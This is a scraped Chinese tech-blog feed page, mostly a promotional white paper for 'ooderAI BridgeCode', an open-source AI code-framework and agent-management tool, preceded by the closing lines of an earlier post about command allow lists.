<p>💡 <strong>思考题</strong>: 你的项目中,哪些命令应该加入白名单?哪些命令必须禁止?如何平衡安全与效率?</p>
</blockquote>
<p>🔗 <strong>相关文章</strong>:</p>
<ul>
<li><a href="https://juejin.cn/post/7602454700503646249" target="_blank" title="https://juejin.cn/post/7602454700503646249">上一篇: 团队宪法: CLAUDE.md 使用技巧</a></li>
</ul>
<hr/>
<p><em>如果这篇文章对你有帮助,欢迎点赞、收藏、分享!有任何问题或建议,欢迎在评论区留言讨论。让我们一起学习,一起成长!</em></p>
<p><em>也欢迎访问我的<a href="https://link.juejin.cn?target=https%3A%2F%2Fhome.wonlab.top" target="_blank" title="https://home.wonlab.top" ref="nofollow noopener noreferrer">个人主页</a>发现更多宝藏资源</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OoderAI BridgeCode 产品白皮书——全方位赋能企业编程升级]]></title>    <link>https://juejin.cn/post/7603142147643392043</link>    <guid>https://juejin.cn/post/7603142147643392043</guid>    <pubDate>2026-02-05T12:51:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603142147643392043" data-draft-id="7603221478473482282" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OoderAI BridgeCode 产品白皮书——全方位赋能企业编程升级"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-02-05T12:51:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="OneCodeCN"/> <meta itemprop="url" content="https://juejin.cn/user/1427583415622366"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OoderAI BridgeCode 产品白皮书——全方位赋能企业编程升级
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1427583415622366/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    OneCodeCN
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T12:51:44.000Z" title="Thu Feb 05 2026 12:51:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读20分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>在AI技术飞速迭代、企业数字化转型进入深水区的今天，编程效率、技术适配性与架构灵活性成为制约企业发展的核心痛点。多数企业面临“已有系统与新AI工具脱节”“代码开发效率低下”“技术栈绑定导致升级困难”“团队工作流程无法适配AI时代需求”等问题，亟需一款能够打通技术断层、赋能团队高效编程、兼顾灵活性与实用性的代码框架解决方案。</p>
<p>ooderAI BridgeCode 应运而生，聚焦企业核心编程需求，以“AI确定性代码框架构建”为核心，通过自学习能力、全流程适配能力与开源灵活特性，助力企业快速搭建专属代码体系，衔接已有应用与前沿AI技术，降低开发成本、提升编程效率，推动企业编程工作向AI化、高效化、标准化转型。</p>
<h2 data-id="heading-1">一、产品概述：AI驱动的企业专属代码框架解决方案</h2>
<p>ooderAI BridgeCode 是一款专为企业打造的AI确定性代码框架生成工具，核心定位是“为企业快速构建属于自己的AI确定性代码框架，助力企业编程”，充当已有应用系统与 ooderAI 生态之间的“桥梁”，同时为企业编程团队提供AI时代的全流程支撑。</p>
<p>不同于传统代码生成工具，BridgeCode 以“企业个性化适配”为核心，无需企业迁就标准化模板，而是主动学习企业技术特点与业务需求，生成贴合企业实际、可直接落地的代码框架与工作体系，真正实现“工具适配企业，而非企业适配工具”，让每一家企业都能拥有专属的高效编程解决方案。</p>
<h3 data-id="heading-2">1.1 核心价值</h3>
<ul>
<li><strong>降本增效</strong>：自动生成全套适配代码，减少手动编码工作量，缩短开发周期，降低企业人力成本与时间成本；</li>
<li><strong>打破断层</strong>：无缝衔接企业已有应用与 ooderAI 代码，解决新旧系统兼容难题，实现技术体系的平滑过渡；</li>
<li><strong>个性适配</strong>：基于企业自身代码特点与技术路线自学习，生成专属代码框架，适配企业个性化技术需求；</li>
<li><strong>AI赋能</strong>：适配AI时代编程需求，优化团队工作流程，搭建专属 skills 能力包，推动编程工作向智能化升级；</li>
<li><strong>灵活无绑定</strong>：开源设计，无技术栈绑定，支持企业自主扩展与升级，保护企业现有技术投资。</li>
</ul>
<h2 data-id="heading-3">二、产品核心能力：全方位赋能企业编程升级</h2>
<p>ooderAI BridgeCode 依托AI技术与开源生态，构建两大核心能力，覆盖“代码生成”与“流程优化”全场景，从技术层面到管理层面，全方位助力企业编程效率与质量双提升，适配AI时代企业编程的核心需求。</p>
<h3 data-id="heading-4">2.1 自学习的 BridgeCode 代码生成能力</h3>
<p>BridgeCode 核心亮点在于“自学习、自适应”，无需人工手动配置大量参数，即可自动贴合企业技术体系，生成全套可直接运行的 BridgeCode 代码，实现已有应用与 ooderAI 代码的无缝衔接，彻底解决“代码不兼容、衔接繁琐”的行业痛点。</p>
<p>其核心工作流程采用Web化可视化设计（适配企业Web端操作习惯，界面简洁易上手），具体如下：</p>
<ol>
<li><strong>数据采集</strong>：自动采集企业已有代码库、技术文档、开发规范等相关数据，涵盖代码风格、命名规范、技术栈选型、架构模式等核心信息，无需人工手动上传；</li>
<li><strong>智能学习</strong>：通过内置AI算法，深度分析企业代码特点、技术路线与开发习惯，建立企业专属技术模型，精准捕捉企业编程核心需求与适配要点；</li>
<li><strong>代码生成</strong>：基于学习到的企业技术模型，自动生成全套 BridgeCode 代码，包括衔接层代码、适配层代码、兼容层代码等，代码风格、技术规范与企业现有代码完全一致，无需人工二次修改；</li>
<li><strong>无缝衔接</strong>：生成的 BridgeCode 代码可直接嵌入企业已有应用系统，实现与 ooderAI 代码的无缝对接，支持实时调试、在线修改（Web端可视化调试界面，操作便捷），确保衔接稳定无异常；</li>
<li><strong>动态优化</strong>：企业代码体系、技术路线发生变更时，BridgeCode 可自动重新学习，更新代码生成逻辑，确保代码框架始终与企业技术体系同步适配，无需重新搭建框架。</li>
</ol>
<p>Web化美化适配：代码生成过程实时可视化展示，生成结果支持Web端在线预览、复制、导出，调试界面支持语法高亮、错误提示、一键修复，贴合企业开发人员Web端操作习惯，提升使用体验。</p>
<h4 data-id="heading-5">2.1.1 代码生成核心业务流程</h4>
<p>以下为 BridgeCode 自学习代码生成及无缝衔接的核心业务流程示意图</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/402443daf5b04774a830b9245915518a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770900704&amp;x-signature=du1aYDY5sVio8nxdloZVqYSsyRU%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<h3 data-id="heading-6">2.2 AI时代工作流程优化与 skills 能力包搭建</h3>
<p>BridgeCode 不止于代码生成，更聚焦企业编程团队的全流程效率提升，结合AI时代编程特点，为企业优化现有工作流程，并辅助搭建全套 skills 能力包，让团队工作更贴合AI时代需求，实现“流程标准化、能力体系化”。</p>
<h4 data-id="heading-7">2.2.1 工作流程智能推荐与优化</h4>
<p>基于企业已有技术架构、团队规模、开发模式与工作流程，BridgeCode 通过AI分析，精准识别现有流程中的冗余环节、效率瓶颈（如沟通成本高、分工不清晰、重复工作多等），推荐并生成符合AI时代特点的标准化编程工作流程。</p>
<p>优化后的流程具备以下特点：</p>
<ul>
<li><strong>AI协同</strong>：融入AI辅助编程环节，如代码自动审查、错误自动排查、重复代码自动优化，减少人工干预，提升编程准确性；</li>
<li><strong>分工清晰</strong>：明确团队各角色（开发、测试、运维）的职责与协作节点，打通团队协作断层，降低沟通成本；</li>
<li><strong>高效迭代</strong>：简化流程环节，缩短开发、调试、上线的周期，支持快速迭代，适配企业快速响应市场需求的场景；</li>
<li><strong>灵活适配</strong>：流程可根据企业业务变化、团队调整进行自定义修改（Web端可视化流程配置界面，拖拽即可调整节点），无需复杂操作。</li>
</ul>
<h4 data-id="heading-8">2.2.2 团队工作流程优示意图</h4>
<p>以下为 BridgeCode 优化后的AI时代企业编程团队工作流绘图</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f62bbaacc1d14ab3b2228f2a3420fcf1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770900704&amp;x-signature=1MU65YOFLxpSzBC%2FhE21ag47YXU%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<h4 data-id="heading-9">2.2.2 全套 skills 能力包辅助搭建</h4>
<p>skills 能力包是企业编程团队的“能力手册”，涵盖编程规范、技术技巧、工具使用、问题解决方案等核心内容，BridgeCode 结合企业技术栈与工作流程，辅助企业搭建全套、专属的 skills 能力包，助力团队能力标准化、提升团队整体编程水平。</p>
<p>能力包搭建核心支持：</p>
<ul>
<li><strong>内容个性化</strong>：基于企业技术路线（如Java、Vue、React等）与编程需求，自动生成贴合企业实际的 skills 内容，避免冗余、无用信息；</li>
<li><strong>体系化梳理</strong>：将 skills 内容按“编程规范、技术技巧、工具使用、错误排查、适配方案”等模块分类梳理，结构清晰，便于团队查询、学习；</li>
<li><strong>实时更新</strong>：当企业技术栈升级、工作流程优化或行业出现新技术时，自动更新 skills 能力包内容，确保团队掌握最新、最适配的技术能力；</li>
<li><strong>Web化共享</strong>：skills 能力包支持Web端在线查看、搜索、下载、分享，团队成员可随时查阅学习，实现知识共享，提升团队整体效率。</li>
</ul>
<h2 data-id="heading-10">三、产品核心特点：开源灵活，全方位适配企业需求</h2>
<p>ooderAI BridgeCode 以“企业需求为核心”，结合AI技术与开源生态，打造四大核心特点，兼顾灵活性、实用性、易用性，适配不同规模、不同技术路线的企业需求，同时注重Web化美化适配，提升用户操作体验。</p>
<h3 data-id="heading-11">3.1 核心技术架构：ooder 表单引擎 + ooder-nlpModule 自然语言模型</h3>
<p>产品底层依托两大核心技术架构，确保代码生成的准确性、效率与灵活性，同时为Web化操作、可视化设计提供坚实支撑：</p>
<ul>
<li><strong>ooder 表单引擎</strong>：提供强大的表单设计、数据交互能力，支撑 BridgeCode Web端可视化操作界面（如流程配置、参数设置、代码调试等），界面美观、操作便捷，适配企业各类终端（电脑、平板）Web访问需求；同时支持表单数据与代码生成逻辑的无缝联动，确保操作与结果的实时同步。</li>
<li><strong>ooder-nlpModule 自然语言模型</strong>：核心支撑自学习能力与工作流程优化，能够精准识别企业技术文档、代码注释中的自然语言信息，深度理解企业编程需求与技术规范，同时支持自然语言指令操作（如通过自然语言下达代码生成、流程调整指令），降低操作门槛，让非专业开发人员也能快速上手。</li>
</ul>
<p>两大技术架构深度融合，既确保了代码生成的技术稳定性，又提升了产品的易用性与Web化适配性，实现“技术专业、操作简单”的双重优势。</p>
<h4 data-id="heading-12">3.1.1 核心技术架构</h4>
<p>以下为 ooderAI BridgeCode 核心技术架构示意图</p>
<p>​</p>
<p>​</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9422b5e39d8f445fbfa73f37d6b7a2f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770900704&amp;x-signature=5JsSTOP4KIvwGpDVDtLfuHoF16M%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<p>​</p>
<h3 data-id="heading-13">3.2 开源设计：无技术绑定，自主可控</h3>
<p>BridgeCode 采用全开源设计，彻底打破“技术绑定”壁垒，让企业拥有绝对的自主控制权，无需担心依赖第三方工具导致的升级受限、成本增加等问题，是企业长期数字化转型的可靠选择。</p>
<p>开源核心优势：</p>
<ul>
<li><strong>无技术栈绑定</strong>：支持Java、Vue、React、Python等多种主流技术栈，企业可保留现有技术栈，无需重构系统，直接适配使用；</li>
<li><strong>代码自主可控</strong>：开源全部核心代码，企业可根据自身需求进行二次开发、定制修改，优化代码生成逻辑、工作流程或Web端操作界面，贴合企业个性化需求；</li>
<li><strong>免费无门槛</strong>：核心功能完全免费，无license限制，企业无需支付高额费用即可使用全部核心能力，降低企业成本；</li>
<li><strong>社区支撑</strong>：拥有完善的开源社区，聚集大量技术开发者，企业可在社区获取技术支持、分享经验、获取最新升级包，快速解决使用过程中遇到的问题。</li>
</ul>
<h3 data-id="heading-14">3.3 全系列开源可视化工具：128个组件，助力低代码开发</h3>
<p>BridgeCode 配套提供全系列开源可视化工具，涵盖128个常用组件，打造全套前端可视化 skills 辅助低代码组件生成器，兼顾专业开发人员与非专业人员的使用需求，进一步降低企业编程门槛，提升开发效率，同时所有工具均采用Web化美化设计，界面简洁、交互流畅。</p>
<p>核心工具与组件优势：</p>
<ul>
<li><strong>组件丰富全面</strong>：128个组件覆盖前端开发、表单设计、数据可视化、交互操作等全场景，包括按钮、输入框、表格、图表、弹窗、导航等常用组件，无需人工重复开发；</li>
<li><strong>可视化低代码开发</strong>：支持拖拽式组件布局、可视化参数配置，非专业开发人员可通过简单拖拽、勾选，快速生成前端组件代码，专业开发人员可在此基础上进行优化，兼顾效率与灵活性；</li>
<li><strong>开源可扩展</strong>：所有可视化工具与组件均开源，企业可根据自身需求扩展组件功能、新增自定义组件，适配企业个性化前端开发需求；</li>
<li><strong>Web化适配</strong>：所有可视化工具均支持Web端操作，组件生成后可直接在Web端预览、修改、导出，适配企业Web端开发流程，同时支持响应式设计，适配不同屏幕尺寸。</li>
</ul>
<p>全套前端可视化 skills 同步配套，详细说明各组件的使用方法、适配场景、代码示例，辅助团队快速掌握工具使用技巧，进一步提升开发效率。</p>
<h3 data-id="heading-15">3.4 完善完整开源的 Agent 管理方案</h3>
<p>针对AI时代企业编程的智能化需求，BridgeCode 提供完善完整的开源 Agent 管理方案，实现AI Agent 的全生命周期管理，助力企业搭建智能化编程辅助体系，进一步释放AI技术的价值，同时管理方案采用Web化可视化管理界面，便于企业统一管控。</p>
<p>Agent 管理方案核心功能：</p>
<ul>
<li><strong>Agent 快速部署</strong>：提供开源的 Agent 模板，企业可快速部署适配自身需求的AI Agent（如代码审查Agent、错误排查Agent、代码优化Agent等），无需从零开发；</li>
<li><strong>全生命周期管理</strong>：支持 Agent 的创建、配置、启动、停止、更新、删除等全流程管理，Web端可视化管控界面，可实时查看 Agent 运行状态、执行日志，便于运维管理；</li>
<li><strong>个性化配置</strong>：可根据企业编程需求，自定义 Agent 的功能、执行逻辑、触发条件，让 Agent 更贴合企业实际需求；</li>
<li><strong>开源可扩展</strong>：Agent 管理方案全部开源，企业可扩展 Agent 类型、优化管理逻辑，适配企业AI化升级的长期需求，同时支持与企业现有运维管理系统无缝对接。</li>
</ul>
<h4 data-id="heading-16">3.4.1 Agent 全生命周期管理流程Web绘图</h4>
<p>以下为 BridgeCode Agent 管理方案的全生命周期流程示意图：</p>
<p>​</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b7c7e3c3ec82456bb4f707ef11cfda78~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770900704&amp;x-signature=zJ4u1zkP5nISSlE7XC2R9qqt%2Bog%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<p>​</p>
<h2 data-id="heading-17">四、产品优势：对比传统方案，打造核心竞争力</h2>








































<table><thead><tr><th align="left">对比维度</th><th align="left">传统代码生成工具/方案</th><th align="left">ooderAI BridgeCode</th></tr></thead><tbody><tr><td align="left">代码生成适配性</td><td align="left">标准化模板，需人工大量修改，难以贴合企业个性化技术路线</td><td align="left">自学习能力，自动适配企业代码特点与技术路线，生成专属代码，无需二次修改</td></tr><tr><td align="left">新旧系统衔接</td><td align="left">衔接繁琐，需人工编写大量适配代码，易出现兼容问题</td><td align="left">自动生成衔接代码，无缝衔接已有应用与 ooderAI 代码，稳定无异常</td></tr><tr><td align="left">技术绑定</td><td align="left">多为闭源方案，绑定特定技术栈，升级受限</td><td align="left">全开源设计，无技术绑定，支持多技术栈适配，可自主二次开发</td></tr><tr><td align="left">可视化与易用性</td><td align="left">多为命令行操作或简单界面，可视化程度低，操作复杂</td><td align="left">全Web化美化设计，可视化操作界面，拖拽式配置，128个可视化组件辅助，易用性强</td></tr><tr><td align="left">AI时代适配性</td><td align="left">无AI自学习能力，不支持工作流程优化与 Agent 管理</td><td align="left">内置AI自学习算法，优化AI时代工作流程，提供完整开源 Agent 管理方案</td></tr><tr><td align="left">成本控制</td><td align="left">闭源方案费用高昂，二次开发成本高</td><td align="left">核心功能免费开源，无license费用，二次开发成本低，降低企业人力与资金成本</td></tr></tbody></table>
<h2 data-id="heading-18">五、适用场景：覆盖全行业企业编程需求</h2>
<p>ooderAI BridgeCode 凭借其灵活性、适配性与易用性，可广泛应用于各类规模、各类行业的企业，尤其适合面临“代码衔接困难、开发效率低下、技术栈多样、AI化转型需求迫切”的企业，核心适用场景如下：</p>
<h3 data-id="heading-19">5.1 中小企业编程效率提升</h3>
<p>中小企业团队规模小、开发人力有限，面临“一人多岗、开发周期紧张”的问题。BridgeCode 自动生成代码、简化工作流程的能力，可大幅减少手动编码工作量，让开发人员聚焦核心业务开发，同时低门槛的可视化操作的让非专业人员也能参与基础代码生成，进一步提升团队效率，降低人力成本。</p>
<h3 data-id="heading-20">5.2 大型企业技术体系衔接与标准化</h3>
<p>大型企业技术栈多样、已有系统繁杂，不同部门可能采用不同的技术路线，导致代码衔接困难、工作流程不统一。BridgeCode 支持多技术栈适配、自动生成衔接代码，可打通各部门技术断层；同时可优化工作流程、搭建标准化 skills 能力包，实现企业编程工作的标准化、规范化，提升团队协同效率。</p>
<h3 data-id="heading-21">5.3 企业AI化编程转型</h3>
<p>希望引入AI技术优化编程工作、提升智能化水平的企业，BridgeCode 提供的AI自学习能力、Agent 管理方案与AI时代工作流程优化能力，可助力企业快速搭建智能化编程体系，实现代码生成、审查、优化的智能化，推动企业编程工作向AI化转型。</p>
<h3 data-id="heading-22">5.4 低代码开发团队支撑</h3>
<p>采用低代码开发模式的企业或团队，BridgeCode 配套的128个开源可视化组件、低代码组件生成器，可进一步丰富低代码开发的组件库，降低低代码开发门槛，同时自学习能力可适配企业低代码开发规范，生成贴合企业需求的低代码组件与衔接代码，提升低代码开发效率与质量。</p>
<h3 data-id="heading-23">5.5 多技术栈协同开发场景</h3>
<p>企业内部存在多个技术栈（如前端Vue/React、后端Java/Python），团队协同开发困难的场景，BridgeCode 无技术绑定、多技术栈适配的特点，可让不同技术栈的团队共用一套工具，生成适配各自技术栈的代码，打通协同开发断层，降低沟通成本。</p>
<h2 data-id="heading-24">六、实施与支持：助力企业快速落地，长期赋能</h2>
<p>ooderAI BridgeCode 致力于为企业提供“全流程、全方位”的实施与技术支持，确保企业能够快速落地产品、熟练使用核心功能，同时依托开源社区与专业团队，为企业长期发展提供技术保障。</p>
<h3 data-id="heading-25">6.1 实施流程</h3>
<ol>
<li><strong>需求对接</strong>：专业团队对接企业，了解企业技术栈、代码特点、编程需求与痛点，制定个性化实施方案；</li>
<li><strong>产品部署</strong>：提供详细的部署文档与Web化部署指引，支持本地部署、云端部署，快速完成产品部署与环境配置；</li>
<li><strong>调试适配</strong>：协助企业完成 BridgeCode 的自学习调试，确保代码生成、系统衔接符合企业需求，优化Web端操作体验；</li>
<li><strong>培训指导</strong>：针对企业团队开展专项培训，涵盖产品核心功能、Web端操作方法、技能包使用、Agent 部署等内容，确保团队熟练上手；</li>
<li><strong>落地上线</strong>：协助企业完成产品落地上线，实时监控运行状态，及时解决上线过程中遇到的问题；</li>
<li><strong>长期优化</strong>：根据企业业务发展与技术升级需求，提供长期优化建议，协助企业进行产品二次开发与功能扩展。</li>
</ol>
<p>​</p>
<h4 data-id="heading-26">6.1.1 产品实施全流程eb绘图</h4>
<p>以下为 ooderAI BridgeCode 企业实施全流程W示意图：</p>
<p>​</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/138de841bcdf45a4bc66cf2e5b743d6d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770900704&amp;x-signature=fhcGEHO6mRQ%2B06ZTI2OqTc4TG7o%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<h3 data-id="heading-27">6.2 技术支持</h3>
<ul>
<li><strong>开源社区支持</strong>：企业可在开源社区获取技术文档、操作教程、常见问题解决方案，同时可与其他企业、开发者交流经验，获取最新升级包；</li>
<li><strong>在线技术支持</strong>：提供7×12小时在线技术咨询服务，快速响应企业问题，协助解决产品使用、部署、调试过程中遇到的难题；</li>
<li><strong>定制化支持</strong>：针对企业个性化需求，提供定制化开发、流程优化、Agent 定制等服务，助力企业实现产品与业务的深度适配；</li>
<li><strong>版本升级支持</strong>：持续迭代产品版本，优化核心功能、新增组件与能力，为企业提供免费版本升级指导，确保企业始终使用最新、最优质的产品功能。</li>
</ul>
<h2 data-id="heading-28">七、未来规划：持续迭代，赋能企业AI编程新未来</h2>
<p>ooderAI BridgeCode 将始终以企业需求为核心，依托AI技术与开源生态，持续迭代优化产品功能，不断提升产品的适配性、易用性与智能化水平，助力企业在AI时代实现编程效率与质量的双重飞跃，未来规划主要聚焦以下方向：</p>
<ul>
<li><strong>AI能力升级</strong>：优化自学习算法，提升代码生成的准确性与效率，新增AI代码重构、AI需求转化（自然语言转代码）等功能，进一步释放AI技术价值；</li>
<li><strong>组件与工具扩展</strong>：持续扩充可视化组件库，计划新增至200+组件，覆盖更多开发场景；同时优化低代码组件生成器，提升可视化开发体验与灵活性；</li>
<li><strong>Web化体验优化</strong>：进一步美化Web端操作界面，新增个性化界面配置、多语言支持等功能，适配不同企业的操作习惯与需求；</li>
<li><strong>生态融合深化</strong>：加强与 ooderAI 生态的深度融合，同时对接更多主流开发工具、运维系统、云平台，打造全方位的企业编程生态体系；</li>
<li><strong>开源社区建设</strong>：扩大开源社区规模，吸引更多开发者参与产品迭代与优化，丰富社区资源，为企业提供更全面的技术支持；</li>
<li><strong>行业定制化适配</strong>：针对金融、制造、互联网、医疗等重点行业，开发行业专属模板、组件与 Agent 方案，进一步提升产品的行业适配性。</li>
</ul>
<h2 data-id="heading-29">八、结语</h2>
<p>在AI技术重塑企业编程模式的今天，高效、灵活、智能的代码框架解决方案，成为企业数字化转型的核心支撑。ooderAI BridgeCode 以“为企业快速构建属于自己的AI确定性代码框架，助力企业编程”为核心，凭借自学习的代码生成能力、AI时代的流程优化能力、开源灵活的产品特点与Web化的易用设计，打破传统代码生成方案的局限，打通企业技术断层，降低开发成本，提升编程效率，助力企业实现AI化编程转型。</p>
<p>未来，ooderAI BridgeCode 将持续迭代、不断创新，依托开源生态与专业团队，为企业提供更优质、更贴合需求的产品与服务，与企业携手，共同开启AI编程新未来，助力企业在数字化转型的道路上稳步前行。</p>
<h2 data-id="heading-30">附录：产品相关资源</h2>
<ul>
<li>开源社区地址：</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Foodercn%2Fsuper-Agent" target="_blank" title="https://github.com/oodercn/super-Agent" ref="nofollow noopener noreferrer">github.com/oodercn/sup…</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2FooderCN%2Fsuper-agent" target="_blank" title="https://gitee.com/ooderCN/super-agent" ref="nofollow noopener noreferrer">gitee.com/ooderCN/sup…</a></li>
